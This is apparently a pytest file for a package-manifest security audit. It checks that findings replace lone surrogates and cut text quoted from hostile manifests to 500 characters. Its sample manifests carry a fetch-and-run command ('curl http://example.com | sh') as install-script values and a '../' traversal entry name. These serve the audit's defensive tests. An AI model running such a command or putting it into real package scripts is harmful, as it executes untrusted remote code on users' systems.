"""Tests for the texts of a PackageAuditFinding: whatever the package controls, a finding can be echoed.

[INPUT]
- backends.skills.scanning.package_audit::PackageAuditFinding, audit_package_json, audit_package_manifest_dict,
  audit_package_entry_artifacts, check_lifecycle_scripts (POS: the manifest audit whose findings are under test)

[OUTPUT]
- Fails when a finding carries text UTF-8 cannot encode, when the description or the detail quoted from a hostile manifest
  is not cut to 500 characters, or when an ordinary finding is changed.

[POS]
A finding is returned in HTTP responses and written to the database; one lone surrogate in it fails the response, and
one megabyte quoted from a manifest bloats it.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from myrm_agent_harness.backends.skills.scanning.package_audit import (
    PackageAuditFinding,
    audit_package_entry_artifacts,
    audit_package_json,
    audit_package_manifest_dict,
    check_lifecycle_scripts,
)

LONE = "\ud800"
REPLACED = "\ufffd"


def _assert_every_text_encodes(findings: list[PackageAuditFinding]) -> None:
    assert findings
    for finding in findings:
        for text in (finding.threat_type, finding.severity, finding.description, finding.file_path, finding.detail):
            text.encode("utf-8")


def test_a_lone_surrogate_in_any_text_of_a_finding_is_replaced() -> None:
    finding = PackageAuditFinding(
        threat_type="supply_chain",
        severity="high",
        description=f"a{LONE}",
        file_path=f"dir{LONE}/package.json",
        detail=f"b{LONE}",
    )

    assert (finding.description, finding.file_path, finding.detail) == (
        f"a{REPLACED}",
        f"dir{REPLACED}/package.json",
        f"b{REPLACED}",
    )


def test_a_script_name_holding_a_lone_surrogate_gives_an_encodable_finding() -> None:
    manifest: dict[str, object] = {"scripts": {f"post{LONE}": "curl http://example.com | sh", "preinstall": f"x{LONE}"}}

    _assert_every_text_encodes(audit_package_manifest_dict(manifest, f"p{LONE}/package.json"))


def test_a_surrogate_escaped_in_the_manifest_json_gives_an_encodable_finding() -> None:
    # JSON spells a lone surrogate as an escape, and json.loads turns it into one.
    content = '{"scripts": {"post\\ud800": "curl http://example.com | sh", "install": "x\\udc80y"}}'

    findings = audit_package_json(content, "package.json")

    _assert_every_text_encodes(findings)
    assert any(f.detail == f"install: x{REPLACED}y" for f in findings)


def test_an_in_memory_file_name_with_a_lone_surrogate_gives_an_encodable_path() -> None:
    manifest = json.dumps({"scripts": {"postinstall": "node run.js"}}).encode()

    findings = check_lifecycle_scripts({f"a{LONE}/package.json": manifest})

    assert [f.file_path for f in findings] == [f"a{REPLACED}/package.json"]


def test_the_description_and_the_detail_are_cut_to_500_characters() -> None:
    finding = PackageAuditFinding("integrity", "high", "d" * 10_000, "package.json", "x" * 10_000)

    assert (len(finding.description), len(finding.detail)) == (500, 500)


def test_the_file_path_is_kept_whole() -> None:
    assert len(PackageAuditFinding("integrity", "high", "d", "p" * 2_000).file_path) == 2_000


def test_an_entry_name_quoted_from_a_hostile_manifest_is_bounded(tmp_path: Path) -> None:
    findings = audit_package_entry_artifacts({"main": "../" + "a" * 100_000}, tmp_path)

    assert [f.threat_type for f in findings] == ["integrity"]
    assert (len(findings[0].description), len(findings[0].detail)) == (500, 500)


def test_a_script_name_quoted_from_a_hostile_manifest_is_bounded() -> None:
    findings = audit_package_manifest_dict({"scripts": {"n" * 100_000: "curl http://example.com | sh"}})

    assert [f.severity for f in findings] == ["medium"]
    assert len(findings[0].description) == 500


def test_an_ordinary_finding_is_left_as_it_is() -> None:
    findings = audit_package_json('{"scripts": {"postinstall": "node run.js"}}', "package.json")

    assert [(f.threat_type, f.severity, f.description, f.file_path, f.detail) for f in findings] == [
        ("supply_chain", "high", "Dangerous install script: postinstall", "package.json", "postinstall: node run.js")
    ]


@pytest.mark.parametrize("text", ["", "plain", "naïve café", "\u4e2d\u6587", "emoji \U0001f600"])
def test_an_encodable_text_is_kept(text: str) -> None:
    finding = PackageAuditFinding("t", "high", text, text, text)

    assert (finding.description, finding.file_path, finding.detail) == (text, text, text)
